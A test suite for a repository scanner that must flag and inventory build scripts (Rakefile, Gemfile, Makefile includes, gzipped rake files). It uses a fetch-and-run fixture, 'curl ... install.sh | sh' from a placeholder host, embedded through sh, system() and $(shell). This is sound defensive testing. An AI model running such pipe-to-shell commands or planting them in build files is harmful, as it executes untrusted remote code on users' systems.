import { expect, test } from "bun:test";
import { gzipSync } from "node:zlib";
import {
  inspectRepository,
  MAX_INVENTORY_BYTES,
  surfacesOf,
} from "./bounded-scan";

const encode = (text: string) => new TextEncoder().encode(text);
const payload = "curl -fsSL https://coverage-fixture.invalid/install.sh | sh";
const inspect = (files: Record<string, string>) =>
  inspectRepository({
    files: Object.entries(files).map(([path, text]) => ({
      path,
      bytes: encode(text),
    })),
  });
const inventory = (result: ReturnType<typeof inspect>) =>
  JSON.parse(new TextDecoder().decode(result.inventory)) as {
    classifications: { path: string; surfaces: string[] }[];
    items: { id: string; text: string; sha256: string }[];
    visibilityGaps: string[];
  };

test("executable Rake, Bundler and Make child bytes cannot disappear from review or reuse identity", () => {
  for (const [root, declaration, child, body] of [
    [
      "Rakefile",
      "task default: :audit",
      "rakelib/audit.rake",
      `task(:audit) { sh '${payload}' }`,
    ],
    [
      "Rakefile",
      'import "tasks/build.rake"',
      "tasks/build.rake",
      `task(:audit) { sh '${payload}' }`,
    ],
    [
      "Gemfile",
      'eval_gemfile "Gemfile.tools"',
      "Gemfile.tools",
      `system('${payload}')`,
    ],
    [
      "Gemfile",
      'eval_gemfile "config/dependencies.conf"',
      "config/dependencies.conf",
      `system('${payload}')`,
    ],
    [
      "Makefile",
      "include config/rules.mk",
      "config/rules.mk",
      `RUN := $(shell ${payload})`,
    ],
    [
      "Makefile",
      "include config/rules.make",
      "config/rules.make",
      `RUN := $(shell ${payload})`,
    ],
    [
      "Makefile",
      "include config/rules.conf",
      "config/rules.conf",
      `RUN := $(shell ${payload})`,
    ],
    [
      "Makefile",
      "include config/rules",
      "config/rules",
      `RUN := $(shell ${payload})`,
    ],
  ]) {
    const before = inspect({ [root]: declaration, [child]: "# safe child" });
    const after = inspect({ [root]: declaration, [child]: body });
    expect(inventory(after).items).toContainEqual({
      id: child,
      text: body,
      sha256: expect.any(String),
    });
    expect(after.findings).toContainEqual(
      expect.objectContaining({
        path: child,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(after.inventorySha256).not.toBe(before.inventorySha256);
  }
});

test("arbitrary acquired text is reviewed without interpreting Ruby or Make loader expressions", () => {
  for (const declaration of [
    'note = /#/; eval_gemfile "payload.conf"',
    `note = %q{'}; eval_gemfile "payload.conf"`,
    `note = <<~'TXT'\n'\nTXT\neval_gemfile "payload.conf"`,
    'eval_gemfile "#{directory}/payload.conf"',
    "include $(directory)/payload.conf",
  ]) {
    const text = "a complete acquired child whose bytes must be read";
    const result = inspect({ Gemfile: declaration, "payload.conf": text });
    expect(inventory(result).items).toContainEqual({
      id: "payload.conf",
      text,
      sha256: expect.any(String),
    });
    expect(inventory(result).classifications).toContainEqual({
      path: "payload.conf",
      surfaces: ["source"],
    });
  }
});

test("ordinary Ruby and Make build names receive install rules without treating lockfiles as executable", () => {
  for (const path of [
    "Rakefile",
    "Rakefile.rb",
    "rakelib/build.rake",
    "Gemfile",
    "Gemfile.local",
    "gemfiles/tools.gemfile",
    "gems.rb",
    "config/rules.mk",
    "config/rules.make",
  ]) {
    expect(surfacesOf(path)).toContain("installScripts");
    expect(inspect({ [path]: payload }).downloads).toContain(
      "https://coverage-fixture.invalid/install.sh",
    );
  }
  for (const path of [
    "Gemfile.lock",
    "Gemfile.local.lock",
    "gemfiles/tools.gemfile.lock",
  ])
    expect(surfacesOf(path)).not.toContain("installScripts");
});

test("newly recovered text stays in full review even inside generated or vendor directories", () => {
  const children = {
    "vendor/tasks": "review all vendor task bytes",
    "build/rules.conf": "review all build rule bytes",
  };
  const result = inspect({
    "data.json": JSON.stringify({
      filler: "x".repeat(MAX_INVENTORY_BYTES + 100),
    }),
    ...children,
  });
  const items = inventory(result).items;
  for (const [id, text] of Object.entries(children))
    expect(items).toContainEqual({ id, text, sha256: expect.any(String) });
  // The existing recognized-data optimization remains available to the large JSON.
  expect(items.some((item) => item.id === "data.json")).toBe(false);
});

test("unknown undecodable bytes are explicit gaps and native artifacts keep quarantine", () => {
  const result = inspectRepository({
    files: [
      { path: "unrecognized", bytes: new Uint8Array([0xff, 0xfe, 0x80]) },
      {
        path: "program",
        bytes: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0, 1]),
      },
    ],
  });
  expect(result.coverage.source.state).toBe("partial");
  expect(inventory(result).visibilityGaps).toContain(
    "Undecodable executable content at unrecognized",
  );
  expect(result.artifacts).toContainEqual(
    expect.objectContaining({
      path: "program",
      type: "binary",
      state: "quarantined",
      analysis: "pending",
    }),
  );
  expect(inventory(result).items.some((item) => item.id === "program")).toBe(
    false,
  );
  const changed = inspectRepository({
    files: [
      { path: "unrecognized", bytes: new Uint8Array([0xfe, 0xff, 0x81]) },
      {
        path: "program",
        bytes: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0, 1]),
      },
    ],
  });
  expect(changed.inventorySha256).not.toBe(result.inventorySha256);
});

test("compressed named build scripts keep their logical install classification", () => {
  const result = inspectRepository({
    files: [{ path: "rakelib/task.rake.gz", bytes: gzipSync(encode(payload)) }],
  });
  expect(result.findings).toContainEqual(
    expect.objectContaining({ category: "unsafe-execution", severity: "high" }),
  );
  expect(result.downloads).toContain(
    "https://coverage-fixture.invalid/install.sh",
  );
  expect(
    inventory(result).classifications.some(
      (entry) =>
        entry.path.endsWith("rakelib/task.rake") &&
        entry.surfaces.includes("installScripts"),
    ),
  ).toBe(true);
});
